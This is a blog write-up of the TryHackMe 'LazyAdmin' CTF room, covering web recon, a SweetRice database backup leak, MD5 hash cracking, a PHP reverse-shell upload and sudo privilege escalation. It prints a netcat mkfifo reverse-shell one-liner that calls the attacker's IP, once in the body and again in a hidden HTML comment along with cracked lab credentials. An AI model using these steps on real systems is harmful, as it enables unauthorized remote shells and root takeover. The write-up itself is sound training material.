---
title: LazyAdmin Write-Up
date: 2023-08-11 21:00:00 -300
#categories: [hacking, cyber analyst]
categories: [TryHackMe, CTF challenges]
tags: [pentest, ctf, red team, pentest]     # TAG names should always be lowercase
#imgs_path: /imgs/lazyadmin/

image:
    path: https://blog.tryhackme.com/content/images/2023/06/Generic-Banner.svg
    lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
    alt: Responsive rendering of Chirpy theme on multiple devices.
---

A TryHackMe room rated as easy focus on webserver exploitation, principal tools used \| nmap \| gobuster \| john \| netcat.



| Room Name                     | Plataform       | Difficulty | My Profile |
|:-----------------------------|:-----------------|:-------------|-----------:|
| [**LazyAdmin**](https://tryhackme.com/room/lazyadmin)        | TryHackMe    | Easy | [**Wpx**](https://tryhackme.com/p/Wpx)



# Scanning


I started with an Nmap scan since it's a CTF room, if it was a real-world scenario, I would start by doing OhSINT to  to gain a broader understanding of the target.

```shell
sudo nmap -v -T4 -sV -O 10.10.158.73 | tee lazyadmin_nmap.txt
```
![nmap scan](/imgs/lazyadmin/nmap_Screenshot_2023-08-11_18-31-59.png)

The `-O` flag requires you to be running as sudo.

The pipe `|` is used to save the output on a file using `tee` while still observing what is happening with the verbose flag `-v`

This scan just got the top 1000 ports so i ran again with less flags set to see if has some ports "hidden" considering that just 2 ports popped open.

```shell
nmap -v -T4 -p- 10.10.158.73 | tee lazyadmin_nmap2.txt
```
This time i did't need to sudo

![nmap scan2 filtered](/imgs/lazyadmin/filtered_Screenshot_2023-08-11_19-31-11.png)

The scan revealed a few filtered ports, which could indicate a firewall blocking the scanner. However, given the difficult of this room, I don't believe these findings are significant.

# Reconnaissance


The port 22 running a SSH usually is usefull when we already has some access to the machine, so I will focus on the HTTP port 80 for now.

I accessed the website and found the default Apache page.

![apache defalt page](/imgs/lazyadmin/apachescreen_Screenshot_2023-08-11_18-41-29.png)

I tried to trigger an error on the URL to see if the version would show up, since my banner grabbing using netcat didn't worked.

![apache error page](/imgs/lazyadmin/apachenotfound_Screenshot_2023-08-11_18-42-18.png)

We are dealing with an apache 2.4.18, as shown in our Nmap result as well.

We can search on Kali for an exploit using `searchsploit apache 2.4` I typically avoid using the whole version number to ensure we don't miss other potentially useful exploits.

![searchsploit](/imgs/lazyadmin/searchsploit.png)

I found this `Apache 2.4.17 < 2.4.38` on line 5 particularly interesting.

I also found the same results searching o google for the "apache 2.4.18 exploit"

![exploitDB](/imgs/lazyadmin/exploitDB1.png)

I explored how to utilize the exploit, to begin with we need to have some kind of access to uploading the code, so at this point we can't really make use of it.

> This is why is important to do deep recon before starting working with the exploits, on CTF challengers it's ok but real scenarios it's a waste of valuable time. With proper reconnaissance I might have discovered a simpler way to exploit it.
{: .prompt-warning }

I forgot I was dealing with a webserver, and at this point I missed the most important thing when doind pentest against an HTTP service, `Directory Discovery`, so let's do that.

I will run gobuster with a medium wordlist

```shell
gobuster dir -v -u http://10.10.158.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.txt
```

![gobuster scan](/imgs/lazyadmin/gobuster1.png)

Righ away the `/content` pops on the screen, so I opened it up to take a look.

It reveals a website management system called SweetRice.

![content page](/imgs/lazyadmin/content_page.png)

I took a break to drink some coffee, when I came back I paused the Gobuster tool to check if any additional pages had appeared. So I used `grep` to sift through my file for HTTP responses with a 200 status code and 301 status code before proceeding.

![grep gobuster result](/imgs/lazyadmin/grep_gobuster.png)

It didn't show anything new.

I researched about the SweetRice on google and found `SweetRice 1.5.1 - Arbitrary File Upload` on exploitDB, but again we need to finish our reconnaissance before jumping to exploits.

I used Gobuster again with a simpler wordlist `/usr/share/wordlists/dirb/commom.txt`, I should have used a SecList wordlist from the start.

```shell
gobuster dir -v -u http://10.10.158.73 -w /usr/share/wordlists/dirb/common.txt | tee gobuster2.txt
```

![grep gobuster result 2](/imgs/lazyadmin/gobuster2.png)

This time the `grep "Status: 403"` has some findings, but nothing seems more relevant than the /content page.

I decided to inspec the source code to see if I find some redirecting links, comments, hidden inputs, etc.

I found this link revealing that the `/content` has more folders and files in it.

![source code](/imgs/lazyadmin/source_code.png)

![content js](/imgs/lazyadmin/content_js_directory.png)


With that I decided to dig a little deep on this `/content/` this time running with a [**SecLists**](https://github.com/danielmiessler/SecLists) wordlist.

```shell
gobuster dir -v -u http://10.10.158.73/content/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | tee gobuster3.txt
```

When the scan was about 35% my machine expired(it was running for six hours), but I think it's enough considering the difficult of the room,  In a real-world scenario, the process would likely be much slower, anyways the `grep` results for this last gobuster:

![grep gobuster result 3](/imgs/lazyadmin/grep_gobuster3.png)

I open up all the links and it's mostly directories that we can navigate, but the `/as` shows a sweet panel(literally).

![sweetrice panel](/imgs/lazyadmin/login_sweetrice.png)

With that discovery I `searchsploit` for sweetrice on kali.

![searchsploit sweetrice](/imgs/lazyadmin/searchsploit_sweetrice.png)

Focusing on the newest versions I oppend up the first 1.5.1 `backup disclousure`, Usually when somethig has `disclousure` on it, means that we don't need any further access to see something importante.

The file shows a `/inc/mysql_backup` path, since we found earlier this path on the gobuster after `/content/`, I will look in to it.

![backup path](/imgs/lazyadmin/backup_path.png)

There's our file, I downloaded the file and opened it.

![sql file](/imgs/lazyadmin/huge_sql_set.png)

Seems to be the backup of the `database` structure, after reading through and researching about it, I finally made sense of the "secret", which was on this part of the code.

![odd sql code](/imgs/lazyadmin/sql_odd_code.png)

Apperently the admin account named `manager` and the passwd which is hashed in MD5, is created when using this to create the database, so I relly on `john` to crack it.

First I created a file with the hash in it, then I ran john with the follow command:

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt
```
As shown bellow, apparently the `--format=` flag was needed in order to work.

```shell
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```
> If you want to use the `rockyou.txt` wordlist on kali, first you need to unzip the .tar file on the wordlists folder.
{: .prompt-tip }

![john results](/imgs/lazyadmin/john_results.png)

Ok great! with that I went to the panel again and tried the credentials.

# Exploiting

The credentials worked and now im facing the admin's dashboard and we can confirme the `sweetrice version 1.5.1`.

![dashboard sweet](/imgs/lazyadmin/dashboard_sweet.png)
 
After look through the admin's page I found a lot of places that could be potentially vulnerable, better go back to reading the searchsploit results.

![searchsploit2 sweetrice](/imgs/lazyadmin/searchsploit2_sweetrice.png)

The one with PHP Code Excecution catch my eyes, it would be really good if we can execute code somehow.

The `SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution` explains that I could write a PHP code and access the file on the `inc/ads/` directory, in our case would be `count/inc/ads/` If this works I'm able to spawn a reverse shell on the machine.



![searchsploit sweetrice](/imgs/lazyadmin/search_exploit_40700html.png)

I made a copy of this `/usr/share/webshells/php/php-reverse-shell.php` webshell on my folder to use it, I checked the configuration and attempted to create the file.


![webshell configuration](/imgs/lazyadmin/shell_config.png)

![create the file](/imgs/lazyadmin/create%20the%20webshell.png)

The system removed the dot from the file name, but it still added the .php extension... that's why is `wpx_shellphp.php`.

Just click Done and a new "ads" is created, then navegate to the directory.

Here is our reverse shell read to use, note here that sometimes we can't see the folder structure and we would rather use the full link instead like this: `/content/inc/ads/wpx_shellphp.php`.

![file ready](/imgs/lazyadmin/file_ready.png)

Setting up a netcat listener to receive the shell.

```shell
nc -lvnp 1337
```

![netcat listener](/imgs/lazyadmin/setting%20the%20listener.png)

Then clicking to open the file with the reverse shell and...

![connection](/imgs/lazyadmin/connecting.png)

We have the shell, so I run some commands just to see `whoami`, where am I `pwd` and list the files to see details about the directory with `ls`.

After that I try to acess the root directory but of course permition denied, so I look around to capture the user flag.

![webshell create](/imgs/lazyadmin/user_flag.png)

Well, at this point we need to find a way to escalate our privilegies, as usual on a CTF challenge we do a simple command to see if our user is running something as `sudo`.

```shell
sudo -l
```

There's some script file written in perl that runs as sudo and maybe we can use it, so I look inside the file to understand it.

![sudo search](/imgs/lazyadmin/sudo_search.png)

Seems to have a script to call this file `/etc/copy.sh`, which turns out to actually be a script that tries to spawn a shell using netcat to connect to an ip, in this case if we just change the ip to be our ip(vpn ip) and change the port(which in this case isn't necessary but you can) then trigger the script, hopefully we'll become root.

So let's do that.

I tried to open the file with nano, but unfourtunatly I can't use it, so I tried Vim(I don't know much but if opens I will use it), but this time the system don't have vim on it.

![nano vim](/imgs/lazyadmin/nano_vim.png)

Well I guess I'll have to handcraft a new file with the information of the shell, using our ip and port.

We will use the `echo` command to achieve this.

I created the file, but when I ran it, didn't worked. I have missed a `/`, so I fixed and tried again.

```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.7.215 8080 >/tmp/f" > /etc/copy.sh
```
The `echo` command followe by a single `>` overwrite the existing one instead of deleting and creating a new one.



I set up the netcat listener again, and I ran the script as you can see below.

```shell
nc -lvnp 8080
```

![handcraft file](/imgs/lazyadmin/fixed_mkfifo.png)

but I got a user shell... I did some research and I found out that i should run as `sudo` of course, it's a lot of tries and sometimes we don't show half of it.

![running the sudo](/imgs/lazyadmin/just_sudo_file.png)

In the end, we should have used the full command...

And we got it!

![grabbing last flag](/imgs/lazyadmin/rt_flag.png)

The machine now is ours, and we are ready to do some post exploitation, to maintain access, exfiltrate data, etc. but I'll leave it like that(for now) since this isn't the purpose of the room.

I tried to keep some errors and problems that I stumbled upon, just to add a more realistic perspective, all the time we keep doing research and hitting walls, and this is a big part of the process of hacking, keep that in mind(reminder for myself).

Thank you for reading!

<!--
 ______________
< Hello Friend >
 --------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
                             
this is the write up in 10 lines :D - kidding, just my notes to keep accessing the machine when it expires.
- http://ip-here/content/
- manager:Password123
- http://ip-here/content/as/?type=ad
- make or edit the reverse shell php
- nc -lvnp 1337
- http://ip-here/content/inc/ads/
- nc -lvnp -8080
- echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc your-vpn-ip-here 8080 >/tmp/f" > /etc/copy.sh
- sudo /usr/bin/perl /home/itguy/backup.pl
-->

